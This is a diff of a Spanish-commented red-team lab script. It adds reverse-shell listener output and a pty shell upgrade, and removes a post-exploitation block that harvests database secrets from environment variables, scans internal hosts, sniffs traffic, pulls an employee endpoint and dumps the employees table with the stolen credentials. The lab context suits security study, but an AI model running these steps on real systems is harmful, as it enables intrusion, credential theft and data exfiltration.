@@ -28,6 +28,19 @@ export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
 stty rows 40 cols 120
 clear
 
+## OUTPUT
+
+Listening on 0.0.0.0 4444
+Connection received on 127.0.0.1 53792
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@a5dc9f32097a:/app# python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@a5dc9f32097a:/app# export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
+export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
+[17:57:56] root@webapp:/app# stty rows 40 cols 120
+stty rows 40 cols 120
+[17:58:19] root@webapp:/app#
 
 # Copiar artefactos del contenedor al host:
 
@@ -49,30 +62,3 @@ for f in lateral.pcap lateral.json creds.txt dump.txt e1_scan.log; do
   docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/$f "$SESSION/$f"
 done
 ls -la "$SESSION"
-
-
-
-# T_exfil
-id
-hostname
-env | grep -E 'DB_|POSTGRES|SECRET' | tee /tmp/creds.txt
-
-# Superficie interna visible
-nmap -sT -Pn -p 22,80,443,5000,5432 --open backend db nginx 2>&1 | tee /tmp/e1_scan.log
-
-# Integridad del tráfico
-tcpdump -i any -w /tmp/lateral.pcap -c 50 host backend &
-sleep 1
-
-# T_lateral - Profundidad
-curl -s http://backend:5000/empleados | tee /tmp/lateral.json
-wc -c /tmp/lateral.json    # bytes fugados (parte de E2)
-
-# T_objetivo
-PGPASSWORD=$(grep DB_PASSWORD /tmp/creds.txt | cut -d= -f2) \
-  psql -h db -U $(grep -E '^DB_USER|^POSTGRES_USER' /tmp/creds.txt | head -1 | cut -d= -f2) \
-       -d $(grep -E '^DB_NAME|^POSTGRES_DB' /tmp/creds.txt | head -1 | cut -d= -f2) \
-       -c 'SELECT count(*) FROM empleados; SELECT * FROM empleados LIMIT 5;' \
-  | tee /tmp/dump.txt
-
-  
